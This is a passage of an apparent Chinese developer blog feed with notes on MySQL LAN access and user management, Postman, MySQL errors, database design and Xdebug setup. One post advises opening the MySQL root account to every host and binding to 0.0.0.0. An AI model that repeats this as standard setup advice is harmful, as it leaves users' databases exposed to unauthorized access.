        <content type="html"><![CDATA[<p>如标题所示，在团队项目开发中这是两个很常见的问题，记录一下。</p><a id="more"></a><h3 id="局域网内共享项目地址"><a href="#局域网内共享项目地址" class="headerlink" title="局域网内共享项目地址"></a>局域网内共享项目地址</h3><p>有时候会有这样一种需求，自己在本地项目做开发，还没放到服务器上，但是其他人希望能在他的电脑上访问项目。</p><p>这个时候就需要这两台电脑在同一个局域网内，也就是连接相同的WiFi 。</p><p>然后查看自己的外网IP 地址是多少：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># mac&#x2F;linux</span><br><span class="line">ifconfig</span><br><span class="line"></span><br><span class="line"># windows</span><br><span class="line">ipconfig</span><br></pre></td></tr></table></figure><p>外网IP 地址通常是以<code>192.168.x.xxx</code>打头的IP ，然后把这个IP 配置到对应的域名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># mac&#x2F;linux</span><br><span class="line">vim &#x2F;usr&#x2F;etc&#x2F;hosts</span><br><span class="line"></span><br><span class="line"># windows</span><br><span class="line">C:\Windows\ System32 \drivers\etc\hosts</span><br><span class="line"></span><br><span class="line"># hosts </span><br><span class="line">127.0.0.1 example.com</span><br><span class="line">192.168.x.xxx example.com</span><br></pre></td></tr></table></figure><p>配置完成之后，直接把<code>example.com</code>这个域名丢给对方，对方就在他自己的电脑上可以访问了。</p><h3 id="局域网内连接Mysql"><a href="#局域网内连接Mysql" class="headerlink" title="局域网内连接Mysql"></a>局域网内连接Mysql</h3><p>想要在局域网内，让别人能连接到我的数据库，需要注意以下两点：</p><ol><li>对本地Mysql 授权，允许其他用户连接</li><li>Mysql 开放外网访问</li></ol><p>对于第一点，可以以下命令来完成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. mysql -hlocalhost -uroot -p;</span><br><span class="line">2. use mysql;</span><br><span class="line"># 修改权限，允许其他人连接：</span><br><span class="line">3. update user set host&#x3D;&#39;%&#39; where user&#x3D;&quot;root&quot;;</span><br><span class="line">4. flush privileges;</span><br></pre></td></tr></table></figure><p>通常完成第一步，就可以连接了，如果连接异常，可以尝试第二步：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 打开Mysql 配置文件</span><br><span class="line">vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;my.cnf</span><br><span class="line"></span><br><span class="line">bind-address &#x3D; 0.0.0.0</span><br><span class="line"># 127.0.0.1 替换成 0.0.0.0;</span><br></pre></td></tr></table></figure><p>然后重启Mysql 数据库即可。</p><blockquote><p>其他人怎么连接我的数据库？</p></blockquote><p>把这个丢给他：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">host：你的外网IP 地址</span><br><span class="line">user：你的Mysql 用户</span><br><span class="line">pwd：你的Mysql 密码</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
            <tag> 局域网 </tag>
            
            <tag> 防火墙 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql5.7用户管理：添加用户、授权、撤权、修改密码</title>
      <link href="/mysql5-7-user-management-add-users-authorize-revoke-rights-modify-passwords/"/>
      <url>/mysql5-7-user-management-add-users-authorize-revoke-rights-modify-passwords/</url>
      
        <content type="html"><![CDATA[<p>因为Mysql 5.7 是目前使用最多的数据库，而5.7 在某些地方又和其他版本有所不同，所以记录一下。</p><a id="more"></a><h2 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 语法：CREATE USER &#39;username&#39;@&#39;host&#39; IDENTIFIED BY &#39;password&#39;;</span><br><span class="line"></span><br><span class="line">mysql&gt;  CREATE USER &#39;boo&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;122410&#39;;</span><br></pre></td></tr></table></figure><p>host 参数说明：</p><ul><li><code>%</code>：匹配所有主机</li><li><code>localhost</code>：当前主机，localhost 不会被解析成IP地址，而是通过UNIXsocket 连接</li><li><code>127.0.0.1</code>：当前主机，通过TCP/IP 协议连接</li><li><code>::1</code>：当前主机，兼容支持ipv6</li></ul><p>此时还没有授权，只能登陆，无法做其余操作</p><h2 id="用户授权"><a href="#用户授权" class="headerlink" title="用户授权"></a>用户授权</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 创建完成之后授权</span><br><span class="line">mysql&gt; grant all privileges ON &#96;dbName&#96;.* TO &#39;username&#39;@&#39;host&#39;;</span><br><span class="line"></span><br><span class="line"># 创建用户同时授权</span><br><span class="line">mysql&gt; grant all privileges on dbName.* to &#39;username&#39;@&#39;host&#39; identified by &#39;password&#39;;</span><br><span class="line"></span><br><span class="line"># 刷新权限</span><br><span class="line">mysql&gt;  flush privileges;</span><br><span class="line"></span><br><span class="line"># 查看用户所有权限</span><br><span class="line">mysql&gt; show grants for dev@&#39;%&#39;;</span><br><span class="line"></span><br><span class="line"># 撤消用户授权，撤消要求各参数与授权时使用的一致，可以先查看授权再撤消</span><br><span class="line">mysql&gt; revoke privileges ON dbName.* FROM &#39;username&#39;@&#39;host&#39;;</span><br></pre></td></tr></table></figure><p>privileges 参数说明：</p><ul><li><code>all privileges</code>: 所有权限；</li><li><code>select</code>: 查询；</li><li><code>insert</code>: 新增记录;</li><li><code>update</code>: 更新记录；</li><li><code>delete</code>: 删除记录；</li><li><code>create</code>: 创建表；</li><li><code>drop</code>: 删除表；</li><li><code>alter</code>: 修改表结构；</li><li><code>index</code>: 索引相关权限；</li><li><code>execute</code>: 执行存储过程与call函数</li><li><code>references</code>： 外键相关；</li><li><code>create temporary tables</code>：创建临时表；</li><li><code>lock tables</code>：锁表；</li><li><code>create view</code>：创建视图；</li><li><code>show view</code>：查看视图结构；</li><li><code>trigger</code>: 触发器；</li></ul><p>dbName 可以是某个库（<code>database</code>），也可以是具体到某张表（<code>database.table</code>），也可以是所整个数据库（<code>*</code>）。</p><h2 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 修改自己的密码</span><br><span class="line">mysql&gt; set password&#x3D;password(&#39;newpassword&#39;);</span><br><span class="line"></span><br><span class="line"># 修改别人密码——方法1</span><br><span class="line">mysql&gt; set password for &#39;username&#39;@&#39;host&#39; &#x3D; password(&#39;newpassword&#39;);</span><br><span class="line"></span><br><span class="line"># 修改别人密码——方法2: 适用mysql5.7以前的版本，5.7以后的版本中mysql.user表没有了password字段</span><br><span class="line">mysql&gt; update mysq.user set password&#x3D;password(&#39;newpassword&#39;) where user&#x3D;&#39;user&#39; and host&#x3D;&#39;host&#39;;</span><br><span class="line"></span><br><span class="line"># 修改别人密码——方法3：适用mysql5.7</span><br><span class="line">mysql&gt; update mysql.user set authentication_string&#x3D;password(&#39;newpassword&#39;) where user&#x3D;&#39;root&#39;;</span><br><span class="line"></span><br><span class="line"># 修改别人密码——方法4</span><br><span class="line">mysql&gt; alter user &#39;test&#39;@&#39;%&#39; identified by &#39;newpassword&#39;;</span><br></pre></td></tr></table></figure><h2 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; DROP USER &#39;username&#39;@&#39;host&#39;;</span><br></pre></td></tr></table></figure><p>不建议直接通过修改<code>mysql.user</code>表去操作用户。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/yu12377/article/details/78214336" target="_blank" rel="noopener">mysql5.7用户管理：添加用户、授权、撤权、修改密码</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Postman 使用技巧整理</title>
      <link href="/postman-tips/"/>
      <url>/postman-tips/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.postman.com/" target="_blank" rel="noopener">Postman</a> 作为http 请求工具，无论是开发还是测试所使用的频率还是挺高的，这篇笔记用来整理一下常用的使用技巧。</p><a id="more"></a><h2 id="发送表单提交"><a href="#发送表单提交" class="headerlink" title="发送表单提交"></a>发送表单提交</h2><p>这里的表单提交就是指传统的表单提交。</p><p>核心请求头信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>body 的数据格式选择<code>form-data</code>。</p><h2 id="发送Ajax-请求"><a href="#发送Ajax-请求" class="headerlink" title="发送Ajax 请求"></a>发送Ajax 请求</h2><p>核心请求头信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*;</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br></pre></td></tr></table></figure><p>body 的数据格式选择 <code>x-www-form-urlencode</code>，如果选择<code>form-data</code>则接收到的数据格式会是这个样子：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200919202055.png" alt=""></p><p>如果以<code>x-www-form-urlencode</code>格式进行提交，那么接收到的数据是这个样子，可以直接通过魔术变量获取使用。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200919202746.png" alt=""></p><h3 id="如何把请求参数作为json-格式进行提交？"><a href="#如何把请求参数作为json-格式进行提交？" class="headerlink" title="如何把请求参数作为json 格式进行提交？"></a>如何把请求参数作为json 格式进行提交？</h3><p>在<code>Body</code>中，选择<code>raw</code> 然后把请求参数以json 的格式填进去。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200919203537.png" alt=""></p><p>不过需要注意，以json 格式提交的请求，用常见的魔术变量获取不到，需要使用以下方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">json_decode(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;));</span><br></pre></td></tr></table></figure><h2 id="提交文件"><a href="#提交文件" class="headerlink" title="提交文件"></a>提交文件</h2><p>有时候我们希望可以测试文件提交，使用 Postman 当然也可以完成。</p><p>请求方式选择POST，Headers 可以不用做选择，Body 选择 <code>form-data</code>，类型由默认的text 改成 file，然后选择需要提交的文件即可。</p><p>注意：key 最好也填上 file 这个关键字。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201030081600.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Postman </tag>
            
            <tag> JSON </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 常见异常分析</title>
      <link href="/mysql-common-exception-analysis/"/>
      <url>/mysql-common-exception-analysis/</url>
      
        <content type="html"><![CDATA[<p>本文用来整理 Mysql 使用过程中遇到的一些问题。</p><a id="more"></a><h2 id="Mysql-无法正常启动"><a href="#Mysql-无法正常启动" class="headerlink" title="Mysql 无法正常启动"></a>Mysql 无法正常启动</h2><p>异常描述：Mysql Server 无法正常启动，Client 连接Mysql 异常如下：</p><blockquote><p>ERROR 2002 (HY000): Can’t connect to local MySQL server through socket ‘/var/run/mysqld/mysqld.sock’ (2)</p></blockquote><p>首先，这个错误意味着 <code>/var/run/mysqld/mysqld.sock</code> 不存在，而该文件之所以不存在，可能是因为没有安装 <code>mysql-server</code>，也可能是因为该文件被移动了。</p><p>如果是需要连接本机的Mysql（mysql -hlocalhost -uroot -p），那么需要先安装 <code>mysql server</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mysql-server -y</span><br></pre></td></tr></table></figure><p>如果Mysql 服务确实有在本地运行，那么请检查<code>/etc/mysql/mysql.conf.d/mysqld.cnf</code> 配置文件，是否存在以下配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket &#x3D; &#x2F;var&#x2F;run&#x2F;mysqld&#x2F;mysqld.sock</span><br></pre></td></tr></table></figure><p>如果只是需要连接其他主机，那么在本机上不安装 <code>Mysql Server</code> 也可以，但需要保证“其他主机”的Mysql 已经正常启动。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h&lt;hostname&gt; -uroot -p</span><br></pre></td></tr></table></figure><p>总结：<br>最有可能的情况是需要连接的Mysql 服务根本没有启动，要么没有在与从终端运行MySQL客户端的主机相同的主机上运行，小概率是因为配置文件错误导致。</p><h2 id="Mysql-用户验证失败"><a href="#Mysql-用户验证失败" class="headerlink" title="Mysql 用户验证失败"></a>Mysql 用户验证失败</h2><p>异常描述：Mysql 创建完该用户之后，赋予权限并设置密码，但是总是会提示如下异常：</p><blockquote><p>ERROR 1045 (28000): Access denied for user ‘zabbix’@’172.17.0.1’ (using password: YES)</p></blockquote><p>出现该异常信息可能有以下几种情况：</p><ol><li>用户名密码错误</li><li>该用户权限不足</li></ol><h2 id="Mysql-断开连接"><a href="#Mysql-断开连接" class="headerlink" title="Mysql 断开连接"></a>Mysql 断开连接</h2><p>异常描述：Mysql 偶尔会自己断开连接，然后必须重启Mysql 服务才能正常运行。</p><blockquote><p>ERROR 2013 (HY000): Lost connection to MySQL server at ‘reading initial communication packet’, system error: 102</p></blockquote><p>目前并没有找到合适的解决方案，不过能大致确定以下几个方向：</p><ol><li>反向DNS 解析，避免使用<code>localhost</code></li><li>允许使用所有连接？</li></ol><p>localhost 对应socket？127.0.0.1 对应 TCP/IP？</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://cloud.tencent.com/developer/ask/35881" target="_blank" rel="noopener">错误2002(HY000)：无法通过Socket‘/var/run/mysqld/mysqld.sock’连接到本地MySQL服务器(2)</a></li><li><a href="https://stackoverflow.com/questions/21091850/error-2013-hy000-lost-connection-to-mysql-server-at-reading-authorization-pa" target="_blank" rel="noopener">ERROR 2013 (HY000): Lost connection to MySQL server at ‘reading authorization packet’, system error: 0</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 数据库设计规范与原则</title>
      <link href="/mysql-database-design-rules-and-principles/"/>
      <url>/mysql-database-design-rules-and-principles/</url>
      
        <content type="html"><![CDATA[<p>最近需要根据业务需求重新设计一套完整的数据库，记录一下规范的数据库设计原则。</p><a id="more"></a><h3 id="1、数据库命名规范"><a href="#1、数据库命名规范" class="headerlink" title="1、数据库命名规范"></a>1、数据库命名规范</h3><ul><li>命名简洁明确，可以采用字母 + 数字进行组合，多个单词可以使用下划线 <code>_</code> 进行分割。</li><li>一般来说，数据表命名用单数，字段命名也用单数</li><li>数据库里面的密码一定要加密，不能保存明文</li><li>Mysql 引擎类型统一使用 InnoDB，字符编码统一使用 UTF-8</li></ul><h3 id="2、数据库表名命名规范"><a href="#2、数据库表名命名规范" class="headerlink" title="2、数据库表名命名规范"></a>2、数据库表名命名规范</h3><ul><li>命名简洁明确，可以采用字母 + 数字进行组合，多个单词可以使用下划线 <code>_</code> 进行分割。</li><li>可以合理增加表前缀，有效区分不同类型的数据表</li></ul><h3 id="3、数据库表字段名命名规范"><a href="#3、数据库表字段名命名规范" class="headerlink" title="3、数据库表字段名命名规范"></a>3、数据库表字段名命名规范</h3><ul><li>命名简洁明确，多个单词使用下划线<code>_</code>进行分割（统一使用小写）</li><li>避免使用自定义缩写，如：<code>date =&gt; dt</code></li><li>表与表之间的相关联字段名称要求尽可能的相同</li><li>每个字段尽量备注其含义</li></ul><h3 id="4、数据库表字段类型规范"><a href="#4、数据库表字段类型规范" class="headerlink" title="4、数据库表字段类型规范"></a>4、数据库表字段类型规范</h3><ul><li>最好给每个字段一个默认值，<strong>避免使用 NULL</strong>。字符型默认值为一个空字符值串，数值型的默认值为数值0，逻辑型的默认值为数值0</li><li>用尽量少的存储空间来存储一个字段的数据</li><li>能用 <code>tinyint</code> 就不用 <code>int</code>，能用 <code>int</code> 就不要用 <code>varchar</code>，能用 <code>varchar(16)</code>就不要用 <code>varchar(225)</code></li><li>boolean 类型的命名统一使用<code>is_xxx</code>格式</li></ul><h3 id="5、数据库表索引规范"><a href="#5、数据库表索引规范" class="headerlink" title="5、数据库表索引规范"></a>5、数据库表索引规范</h3><ul><li>为每个表创建一个主键索引;</li><li>为每个表创建合理的普通索引;</li></ul><h3 id="一些注意事项"><a href="#一些注意事项" class="headerlink" title="一些注意事项"></a>一些注意事项</h3><ul><li>避免使用NULL字段(NULL字段很难查询优化、NULL字段的索引需要额外空间、NULL字段的复合索引无效)</li><li>避免使用 <code>count(*)</code></li><li>避免使用 <code>select *</code></li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/tinywan/p/6547500.html" target="_blank" rel="noopener">MYSQL数据库设计规范与原则</a></li><li><a href="https://changsiyuan.github.io/2016/05/06/2016-5-6-database-design/" target="_blank" rel="noopener">数据库设计原则</a></li><li><a href="https://cloud.tencent.com/developer/article/1054482" target="_blank" rel="noopener">数据库表名字段命名规范</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows、Mac 下使用 PHPStorm 配置 Xdebug，实现断点调试</title>
      <link href="/use-phpstorm-to-configure-xdebug-under-windows-and-mac/"/>
      <url>/use-phpstorm-to-configure-xdebug-under-windows-and-mac/</url>
      
        <content type="html"><![CDATA[<p>搭建过很多次开发环境了，但每次在调试这一块还是会多少耗费一点时间。<br>所以便有了这篇关于<code>PHPSTORM</code>调试的笔记。</p><a id="more"></a><p>在进行调试之前，首先要做的是下载并安装<code>Xdebug</code>，然后才能做相应的配置。</p><h2 id="下载Xdebug（Windows）"><a href="#下载Xdebug（Windows）" class="headerlink" title="下载Xdebug（Windows）"></a>下载Xdebug（Windows）</h2><ul><li><a href="https://xdebug.org/download.php" target="_blank" rel="noopener">xdebug官网</a></li></ul><blockquote><p>如何选择符合自己PHP的版本的Xdebug，可以通过下面这种方法来判断。</p></blockquote><p>使用Xdubug官方提供的一个<a href="https://xdebug.org/wizard.php" target="_blank" rel="noopener">检测工具</a></p><p>在命令行中输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Mac</span><br><span class="line">$ php -i | pbcopy</span><br><span class="line"></span><br><span class="line"># Linux</span><br><span class="line">$ php -i | xsel </span><br><span class="line"></span><br><span class="line"># Windows</span><br><span class="line">$ php -i | clip</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200915211657.png" alt=""></p><p>将输出的<code>phpinfo</code>信息填入，然后就会自动检测该版本的PHP 所对应的Xdebug，如下图（这里以Windows 为例）：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200915211717.png" alt=""></p><p>点击下载相应的文件。</p><h2 id="安装并配置Xdebug"><a href="#安装并配置Xdebug" class="headerlink" title="安装并配置Xdebug"></a>安装并配置Xdebug</h2><ol><li>将下载好的文件放进指定目录 <code>..\php\ext\</code></li><li>配置<code>php.ini</code>文件，这里需要注意的是：要找到正确的<code>php.ini</code>文件。如果你不确定是哪一个，可以参考下面这个方法：</li></ol><p>打印出<code>phpinfo()</code>，找到字段<code>Loaded Configuration File</code>根据后面的路径去找就没错了。</p><p>打开找到的php.ini配置文件，在最后面加上以下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Windows</span><br><span class="line">[XDebug]</span><br><span class="line">zend_extension &#x3D; &quot;C:\xampp\php\ext\php_xdebug-2.6.1-7.2-vc15.dll&quot;  #这个地址指向 xdebug所在的文件路径</span><br><span class="line">xdebug.profiler_enable &#x3D; 1</span><br><span class="line">xdebug.remote_enable &#x3D; 1</span><br><span class="line">xdebug.remote_port&#x3D;9001</span><br><span class="line">xdebug.idekey&#x3D;PHPSTROM</span><br><span class="line">xdebug.remote_host &#x3D; localhost</span><br></pre></td></tr></table></figure><p>其中：</p><ol><li><code>xdebug.remote.host</code>如果是本地调试，填<code>localhost</code>就好。</li><li><code>xdebug.remote_port</code>为调试所监听的端口，通常默认使用 <code>9001</code> ，需要和PHPStorm 中的 Debug port 相同。</li></ol><h2 id="下载并安装Xdebug（Mac）"><a href="#下载并安装Xdebug（Mac）" class="headerlink" title="下载并安装Xdebug（Mac）"></a>下载并安装Xdebug（Mac）</h2><p>Mac 下安装Xdebug，有两种方式：</p><ol><li>使用<code>pecl</code>命令</li><li>通过源码编译</li></ol><h3 id="使用-pecl"><a href="#使用-pecl" class="headerlink" title="使用 pecl"></a>使用 pecl</h3><blockquote><p>Pecl 是 PHP 的包管理器。</p></blockquote><p>这里以<code>PHP5.6</code>为例，需要安装最新<code>2.5.x</code>版本的Xdebug，因为这是<code>PHP5.6</code>提供支持的最后一个版本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pecl install xdebug-2.5.5</span><br></pre></td></tr></table></figure><h3 id="源码编译"><a href="#源码编译" class="headerlink" title="源码编译"></a>源码编译</h3><p>源码获取的方式和上面Windows 的方式是一样的，将输出的<code>phpinfo</code>粘贴至输入框，然后下载对应版本的Xdebug。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ tar -xvzf xdebug-2.9.4.tgz</span><br><span class="line">$ cd xdebug-2.9.4.tgz</span><br><span class="line">$ phpize</span><br><span class="line">$ .&#x2F;configure</span><br><span class="line">$ make</span><br><span class="line">$ cp modules&#x2F;xdebug.so &#x2F;usr&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;xdebug</span><br></pre></td></tr></table></figure><h4 id="启用Xdebug"><a href="#启用Xdebug" class="headerlink" title="启用Xdebug"></a>启用Xdebug</h4><p>无论是通过哪种方式安装，在正式使用之前，都需要手动启用该模块。</p><p>找到对应版本的 php.ini 文件并编辑，在配置文件中的最后部分加上以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line">zend_extension&#x3D;&quot;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;xdebug&#x2F;xdebug.so&quot;</span><br><span class="line">xdebug.profiler_enable &#x3D; 1</span><br><span class="line">xdebug.remote_enable &#x3D; 1</span><br><span class="line">xdebug.remote_port&#x3D;9001</span><br><span class="line">xdebug.idekey&#x3D;PHPSTORM</span><br><span class="line">xdebug.remote_host &#x3D; localhost</span><br></pre></td></tr></table></figure><p>重启PHP即可。</p><blockquote><p>如何检查Xdebug 是否启用？</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ php -m | grep xdebug</span><br><span class="line">xdebug</span><br></pre></td></tr></table></figure><h3 id="在PHPStorm中配置Xdebug"><a href="#在PHPStorm中配置Xdebug" class="headerlink" title="在PHPStorm中配置Xdebug"></a>在PHPStorm中配置Xdebug</h3><h4 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h4><ol><li><code>File-&gt;Setting-&gt;PHP-&gt;Debug</code>，确保<code>PHPStorm</code> 已经找到了<code>Xdebug</code>。</li></ol><p>在刚才的配置没错的前提下，这里是可以看到已经成功安装了<code>Xdebug</code>的。</p><p><img src="https://i.loli.net/2020/03/24/yw6EbgcujoFILXU.png" alt="image.png"></p><p>如果显示没有安装，请检查上面两步操作有无问题。</p><ol start="2"><li><code>File-&gt;Setting-&gt;PHP-&gt;Debug</code></li></ol><p><img src="https://i.loli.net/2020/03/24/iKkmq3AsIy2UOWX.jpg" alt="PHPStorm 2.jpg"></p><p>Debug port 与<code>php.ini</code>配置文件中的<code>xdebug.remote_port</code>的对应参数保持一致。</p><ol start="3"><li><code>File-&gt;Setting-&gt;PHP-&gt;Server</code>，这三个参数的值和<code>php.ini</code>中的保持一致。</li></ol><p><img src="https://i.loli.net/2020/03/24/sgzX4G957CuTWPj.jpg" alt="PHPStorm 3.jpg"></p><ol start="4"><li>配置域名</li></ol><p><img src="https://i.loli.net/2020/03/24/kecrgBb1IfWaVYR.jpg" alt="PHPStorm 4.jpg"></p><p>这里根据实际情况配置，我本地使用80 端口作为项目访问端口，所以这里填的是80。</p><ol start="5"><li>配置调试参数</li></ol><p><img src="https://i.loli.net/2020/03/24/pShQCstHl7N32na.jpg" alt="PHPStorm 5.jpg"></p><ol start="6"><li><code>Run-&gt;Web Server Debug Validation</code>，检查是否配置成功。</li></ol><p><img src="https://i.loli.net/2020/03/24/Plxvs6gKOcqIGV1.jpg" alt="PHPStorm 6.jpg"></p><p>确保项目文件路径和本地域名能正常访问，如果一切正常则能看到输出。</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>Windows 下的PHPStorm 配置和Mac 几乎差不多，保证一下几点是正常的基本上没啥问题。</p><ol><li>确保PHPStorm 启用了对应版本的 Xdebug。</li><li>PHPStorm 的调试信息与<code>php.ini</code>文件中保持一致。</li><li>项目文件路径和本地域名能正常访问。</li></ol><blockquote><p>Xdebug 调试端口并非一定要用9001，只要保持<code>php.ini</code>与<code>PHPStorm</code> 的保持一致就好了。</p></blockquote><h4 id="在PHPStorm中使用Xdebug"><a href="#在PHPStorm中使用Xdebug" class="headerlink" title="在PHPStorm中使用Xdebug"></a>在PHPStorm中使用Xdebug</h4><p>有两种方式使用Xdebug：</p><ol><li>直接在编辑器中开始调试。</li><li>通过在请求地址中附加xdebug 的请求参数来调试，这招通常用来处理一些前后端分离的联动调试。</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://laravel-china.org/articles/16770/the-first-chapter-of-laravel-phpstrom-xdebug-configuration-and-use" target="_blank" rel="noopener">PhpStrom Xdebug 配置与使用</a></li><li><a href="https://getgrav.org/blog/macos-mojave-apache-mysql-vhost-apc" target="_blank" rel="noopener">如何在Mac 上为不同版本的PHP 开启Xdebug</a></li><li><a href="https://www.jetbrains.com/help/phpstorm/configuring-xdebug.html" target="_blank" rel="noopener">配置Xdebug-官方教程</a></li><li><a href="https://xdebug.org/" target="_blank" rel="noopener">Xdebug 官网</a></li><li><a href="https://xdebug.org/wizard.php" target="_blank" rel="noopener">Xdebug 检测工具</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
